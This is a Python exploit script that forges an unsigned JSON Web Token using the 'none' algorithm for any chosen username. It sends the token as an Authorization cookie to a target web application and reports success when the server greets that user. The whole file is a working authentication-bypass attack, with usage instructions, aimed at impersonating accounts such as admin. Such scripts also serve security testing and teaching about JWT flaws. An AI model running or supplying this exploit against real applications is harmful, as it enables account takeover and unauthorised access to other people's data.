import json
import base64
import requests
import argparse

# run the code
# python3 exploit.py -uname admin -url "http://localhost:3000"

def base64url_encode(input: bytes):
    return base64.urlsafe_b64encode(input).decode('utf-8').replace('=','')      

def send_request(token, username, url):
    cookies = {
        'Authorization': token,
    }

    response = requests.get(url, cookies=cookies, verify=False)
        
    if response.status_code == 200:
        if f"Welcome {username}" in response.text:
            print("Account Successfully hacked with the token: ")
            print(token)  

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-uname", help="username for the application")
    parser.add_argument("-url", help="url for the application")

    args = parser.parse_args()


    header = {"typ": "JWT", "alg": "none"}
    payload = {"name": args.uname ,"iat": 0}
    
    json_header = json.dumps(header, separators=(",",":")).encode()
    json_payload = json.dumps(payload, separators=(",",":")).encode()
    
    base64url_encode(json_header)
    
    token = base64url_encode(json_header)+"."+base64url_encode(json_payload)+"."
    
    print(f"Running the hack: ")
    send_request(token, args.uname, args.url)
    
    
    
    